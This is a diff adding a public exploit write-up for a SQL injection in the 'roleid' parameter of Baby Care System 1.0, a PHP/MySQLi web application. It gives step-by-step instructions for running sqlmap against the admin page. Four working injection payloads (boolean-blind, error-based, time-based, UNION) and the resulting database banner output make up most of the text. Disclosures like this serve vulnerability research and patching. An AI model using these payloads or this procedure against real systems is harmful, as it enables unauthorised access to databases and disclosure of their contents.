@@ -1,0 +1,83 @@
+# Exploit Title: Baby Care System 1.0 - 'roleid' SQL Injection
+# Exploit Author: Vijay Sachdeva
+# Date: 2020-12-23
+# Vendor Homepage: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14622&title=Baby+Care+System+in+PHP%2FMySQLi+with+Full+Source+Code+
+# Affected Version: Version 1
+# Tested on Kali Linux
+
+Step 1. Log in to the application with admin credentials.
+
+Step 2. Click on "MENUS" on the left side and then edit any "Page Role".
+
+Step 3. On the edit page, the URL should be: http://localhost/BabyCare-master/admin.php?id=pagerole&action=edit&roleid=7
+
+Step 4. Run sqlmap on the URL where the "roleid" parameter is given
+
+sqlmap -u "
+http://192.168.1.240/BabyCare-master/admin.php?id=pagerole&action=edit&roleid=7"
+--banner
+
+---
+
+Parameter: roleid (GET)
+
+    Type: boolean-based blind
+
+    Title: AND boolean-based blind - WHERE or HAVING clause
+
+    Payload: id=pagerole&action=edit&roleid=8' AND 3077=3077 AND
+'IPDn'='IPDn
+
+
+    Type: error-based
+
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+
+    Payload: id=pagerole&action=edit&roleid=8' AND (SELECT 2834 FROM(SELECT
+COUNT(*),CONCAT(0x7170767871,(SELECT
+(ELT(2834=2834,1))),0x71717a6271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'jnFT'='jnFT
+
+
+    Type: time-based blind
+
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+    Payload: id=pagerole&action=edit&roleid=8' AND (SELECT 4559 FROM
+(SELECT(SLEEP(5)))jaEa) AND 'iBGT'='iBGT
+
+
+    Type: UNION query
+
+    Title: Generic UNION query (NULL) - 4 columns
+
+    Payload: id=pagerole&action=edit&roleid=-2488' UNION ALL SELECT
+CONCAT(0x7170767871,0x7577594366596d7077424f5746685366434a5244775565756b7a41566d63546c5156564e6d67556e,0x71717a6271),NULL,NULL,NULL--
+-
+
+---
+
+[05:32:00] [INFO] the back-end DBMS is MySQL
+
+[05:32:00] [INFO] fetching banner
+
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+
+banner: '10.3.24-MariaDB-2'
+
+---
+
+[08:18:34] [INFO] the back-end DBMS is MySQL
+
+[08:18:34] [INFO] fetching banner
+
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+
+banner: '10.3.24-MariaDB-2'
+
+
+---
+
+Step 5. Sqlmap should inject the web-app successfully which leads to information disclosure.
